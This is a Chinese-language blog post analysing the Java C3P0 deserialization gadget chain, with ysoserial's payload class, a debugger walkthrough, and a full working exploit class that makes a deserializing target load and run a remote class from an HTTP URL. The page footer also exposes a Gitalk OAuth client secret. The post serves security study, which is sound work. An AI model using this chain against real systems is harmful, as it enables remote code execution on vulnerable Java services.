@@ -1,0 +1,439 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化——C3P0 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化——C3P0 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="配置Maven依赖
+&lt;dependency&gt;
+	&lt;groupId&gt;com.mchange&lt;/groupId&gt;
+	&lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+	&lt..." />
+    <meta name="keywords" content="Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化——C3P0
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-14
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="配置maven依赖">配置Maven依赖</h1>
+<pre><code class="language-xml">&lt;dependency&gt;
+	&lt;groupId&gt;com.mchange&lt;/groupId&gt;
+	&lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+	&lt;version&gt;0.9.5.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h1 id="what-is-c3p0">What is C3P0？</h1>
+<p>C3P0是一个开源的<a href="https://baike.baidu.com/item/JDBC/485214">JDBC</a>连接池，它实现了数据源和<a href="https://baike.baidu.com/item/JNDI/3792442">JNDI</a>绑定，支持JDBC3规范和JDBC2的标准扩展。使用它的开源项目有Hibernate、Spring等。</p>
+<h1 id="测试">测试</h1>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/14/e02fce4a21f99.png" alt="image-20220814155230314" loading="lazy"></figure>
+<h1 id="ysoserial">ysoserial</h1>
+<pre><code class="language-java">public class C3P0 implements ObjectPayload&lt;Object&gt; {
+    public Object getObject ( String command ) throws Exception {
+        int sep = command.lastIndexOf(':');
+        if ( sep &lt; 0 ) {
+            throw new IllegalArgumentException(&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;);
+        }
+
+        String url = command.substring(0, sep);
+        String className = command.substring(sep + 1);
+
+        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        Reflections.getField(PoolBackedDataSourceBase.class, &quot;connectionPoolDataSource&quot;).set(b, new PoolSource(className, url));
+        return b;
+    }
+
+
+    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
+
+        private String className;
+        private String url;
+
+        public PoolSource ( String className, String url ) {
+            this.className = className;
+            this.url = url;
+        }
+
+        public Reference getReference () throws NamingException {
+            return new Reference(&quot;exploit&quot;, this.className, this.url);
+        }
+
+        public PrintWriter getLogWriter () throws SQLException {return null;}
+        public void setLogWriter ( PrintWriter out ) throws SQLException {}
+        public void setLoginTimeout ( int seconds ) throws SQLException {}
+        public int getLoginTimeout () throws SQLException {return 0;}
+        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
+        public PooledConnection getPooledConnection () throws SQLException {return null;}
+        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
+
+    }
+
+
+    public static void main ( final String[] args ) throws Exception {
+        PayloadRunner.run(C3P0.class, args);
+    }
+
+}
+</code></pre>
+<p>可以看到<code>ysoserial</code>中的<code>C3P0链</code>通过<code>:</code>来分割<code>URL</code>和<code>需要远程加载的类名</code>。</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/14/7b6362b5cbcaf.png" alt="image-20220814164121129" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/14/d626bbe831e7b.png" alt="image-20220814175904160" loading="lazy"></figure>
+<p>下面来看一下这个PoolSouce类</p>
+<pre><code class="language-java">private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
+
+    private String className;
+    private String url;
+
+    public PoolSource ( String className, String url ) {
+        this.className = className;
+        this.url = url;
+    }
+
+    public Reference getReference () throws NamingException {
+        return new Reference(&quot;exploit&quot;, this.className, this.url);
+    }
+
+    public PrintWriter getLogWriter () throws SQLException {return null;}
+    public void setLogWriter ( PrintWriter out ) throws SQLException {}
+    public void setLoginTimeout ( int seconds ) throws SQLException {}
+    public int getLoginTimeout () throws SQLException {return 0;}
+    public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
+    public PooledConnection getPooledConnection () throws SQLException {return null;}
+    public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
+
+}
+</code></pre>
+<p>这里除了一个构造方法用来赋值以外，还有一个<code>getReference()</code>方法，传入了我们的恶意的<code>url</code>和<code>className</code></p>
+<h1 id="poc调试">Poc调试</h1>
+<h2 id="序列化">序列化</h2>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/14/7150e87489f4d.png" alt="image-20220814192731703" loading="lazy"></figure>
+<p>序列化的时候，如果<code>connectionPoolDataSource</code>是不可序列化的，则会抛出异常</p>
+<pre><code>Exception: Direct serialization provoked a NotSerializableException! Trying indirect
+</code></pre>
+<p>然后尝试使用<code>ReferenceIndirector</code> 对其进行引用的封装，返回一个可以被序列化的 <code>ReferenceSerialized</code> 实例对象。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/fb8f346c33db7.png" alt="image-20220815131321710" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/675192187fb7a.png" alt="image-20220815132801347" loading="lazy"></figure>
+<p>这里调用的<code>getReference()</code>也就是<code>PoolSource</code>的<code>getReference()</code>方法</p>
+<pre><code class="language-java"> public Reference getReference () throws NamingException {
+        return new Reference(&quot;exploit&quot;, this.className, this.url);
+ }
+</code></pre>
+<p>这里就得到了构造的<code>恶意Reference</code>，并且传给了这个可序列化的<code>ReferenceSerialized</code> 实例对象。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/1d593e3c8d3c5.png" alt="image-20220815133440991" loading="lazy"></figure>
+<p>最后序列化的对象是<code>ReferenceSerialized</code> ，其中包含了<code>恶意的reference</code>，当反序列化时，则会被重新实例化一个<code>恶意reference对象</code>，触发恶意代码。</p>
+<h2 id="反序列化">反序列化</h2>
+<pre><code>Gadget:
+	PoolBackedDataSourceBase.readObject()
+    	ReferenceIndirector.getObject()
+        	ReferenceableUtils.referenceToObject()
+           		Class.forName0()
+                	URLClassLoader.loadClass()
+</code></pre>
+<p>这里调用了<code>ReferenceSerialized#getObject()</code></p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/240f958b1c11f.png" alt="image-20220815152549190" loading="lazy"></figure>
+<p>跟进去，这里有个lookup方法，但是没法利用，因为参数<code>contextName</code>是不可控的，唯一可控的就是之前传入的恶意ref</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/6a9052e555f7f.png" alt="image-20220815154310990" loading="lazy"></figure>
+<p>继续往下跟进到<code>referenceToObject()</code>，本质就是将this.reference(恶意链接)转换成Object</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/be5b93537826d.png" alt="image-20220815154637370" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/93312aa07069a.png" alt="image-20220815161436634" loading="lazy"></figure>
+<p>这里获取类名存入<code>var4</code>，获取远程地址存入<code>var11</code>。<code>var6</code>从上下文获取<code>ClassLoader</code>，如果没用获取到，那么就从<code>ReferenceableUtils</code>中获取。如果没找到远程地址，那么<code>var7</code>就等于<code>var6</code>，如果有远程地址，那么就把远程地址赋给<code>	var8</code>，并且传入<code>URLClassLoader</code>。</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/afd32a6d75020.png" alt="image-20220815162801732" loading="lazy"></figure>
+<p>然后通过<code>Class.forName</code>，使用<code>URLClassLoader</code>来得到恶意类(var4)，并且实例化，造成恶意代码执行。</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/c03917413150f.png" alt="image-20220815162944258" loading="lazy"></figure>
+<h2 id="攻击构造">攻击构造</h2>
+<p>构造一个不可序列化的并且实现了 Referenceable 的 ConnectionPoolDataSource 对象，其 <code>getReference()</code> 方法返回带有恶意类位置的 Reference 对象即可。恶意代码如下：</p>
+<pre><code class="language-java">import com.mchange.v2.c3p0.PoolBackedDataSource;
+import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
+
+import javax.naming.NamingException;
+import javax.naming.Reference;
+import javax.naming.Referenceable;
+import javax.sql.ConnectionPoolDataSource;
+import javax.sql.PooledConnection;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.sql.SQLException;
+import java.sql.SQLFeatureNotSupportedException;
+import java.util.logging.Logger;
+
+public class C3P0_Le1a {
+    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
+
+        private String className;
+        private String url;
+
+        public PoolSource ( String className, String url ) {
+            this.className = className;
+            this.url = url;
+        }
+
+        public Reference getReference () throws NamingException {
+            return new Reference(&quot;Le1a&quot;, this.className, this.url);
+        }
+
+        public PrintWriter getLogWriter () throws SQLException {return null;}
+        public void setLogWriter ( PrintWriter out ) throws SQLException {}
+        public void setLoginTimeout ( int seconds ) throws SQLException {}
+        public int getLoginTimeout () throws SQLException {return 0;}
+        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
+        public PooledConnection getPooledConnection () throws SQLException {return null;}
+        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
+
+    }
+
+    public static void main(String[] args) throws Exception {
+        PoolBackedDataSourceBase p = new PoolBackedDataSourceBase(false);
+        ConnectionPoolDataSource pool = new PoolSource(&quot;calc&quot;, &quot;http://localhost:8888/&quot;);
+
+        Field field = PoolBackedDataSourceBase.class.getDeclaredField(&quot;connectionPoolDataSource&quot;);
+        field.setAccessible(true);
+        field.set(p, pool);
+
+        serialize(p);
+        unserialize(&quot;Le1aaaa.bin&quot;);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;Le1aaaa.bin&quot;));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException, IOException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        return ois.readObject();
+    }
+}
+</code></pre>
+<p>反序列化的时候，<code>PoolBackedDataSourceBase</code>中的 <code>ConnectionPoolDataSource</code>因不可序列化，于是返回一个<code>ReferenceSerialized</code>，其中构造的<code>恶意ref</code>包含了恶意地址和类名，最后通过<code>URLClassLoader</code>加载远程地址中的恶意类。</p>
+<h1 id="疑问">疑问</h1>
+<p>当正确构造EXP后，成功弹出计算器。但是当我们修改远程端口号，甚至远程地址的IP，并且删除掉之前的bin</p>
+<p>文件后，仍能弹出计算器！！！只有当修改恶意类名时，才不能触发。</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/9b3a66574b667.png" alt="image-20220815172752415" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/93995a39b0d6d.png" alt="image-20220815172859161" loading="lazy"></figure>
+<p>难道是因为这个原因么？🥺😲😴</p>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/08/15/2173aba032eaf.png" alt="image-20220815173327039" loading="lazy"></figure>
+<h1 id="参考">参考</h1>
+<p><a href="https://blog.csdn.net/u013190417/article/details/124311482?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-124311482-blog-123208761.pc_relevant_multi_platform_featuressortv2removedup&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-124311482-blog-123208761.pc_relevant_multi_platform_featuressortv2removedup&amp;utm_relevant_index=2">虚幻私塾</a></p>
+<p><a href="https://blog.csdn.net/rfrder/article/details/123208761">feng</a></p>
+<p><a href="https://su18.org/post/ysoserial-su18-5/#c3p0">su18</a></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E9%85%8D%E7%BD%AEmaven%E4%BE%9D%E8%B5%96">配置Maven依赖</a></li>
+<li><a href="#what-is-c3p0">What is C3P0？</a></li>
+<li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li>
+<li><a href="#ysoserial">ysoserial</a></li>
+<li><a href="#poc%E8%B0%83%E8%AF%95">Poc调试</a>
+<ul>
+<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96">序列化</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0">攻击构造</a></li>
+</ul>
+</li>
+<li><a href="#%E7%96%91%E9%97%AE">疑问</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/Java代码审计篇——ofcms/">
+              <h3 class="post-title">
+                Java代码审计篇——ofcms
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
